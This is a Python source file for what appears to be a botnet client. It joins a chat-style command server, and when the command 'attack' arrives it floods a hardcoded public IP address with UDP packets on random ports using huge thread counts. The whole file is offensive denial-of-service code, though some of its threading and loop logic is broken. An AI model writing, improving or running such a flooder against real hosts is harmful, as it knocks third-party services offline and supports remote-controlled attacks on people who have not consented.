import binascii
import os
import random
import socket
import threading
import time

alias = input('Choose an alias >>> ')
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 59008))

target = '3.135.186.136'
threads = 500000000
timer = 60000


def attack():
    try:
        byte = binascii.hexlify(os.urandom(1024))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        timeout = time.time() + 1 * timer
        while time.time() < timeout:
            port = random.randint(20, 5550)
            sock.sendto(byte * random.randint(5, 15), (target, port))
            return
    except socket.error as e:
        pass



def call_attack():
    print('\n[+] Starting Attack...')

    for x in range(0, threads):
        print(x)
        threading.Thread(target=attack()).start()

    print('\n[+] attack done')


def client_receive():
    while True:
        try:
            message = client.recv(1024).decode('utf-8')
            if message == "attack":
                call_attack()
            elif message == "alias?":
                client.send(alias.encode('utf-8'))
            else:
                print(message)
        except:
            print('Error!')
            client.close()
            break


def client_send():
    while True:
        message = f'{alias}: {input("")}'
        client.send(message.encode('utf-8'))


receive_thread = threading.Thread(target=client_receive)
receive_thread.start()

send_thread = threading.Thread(target=client_send)
send_thread.start()
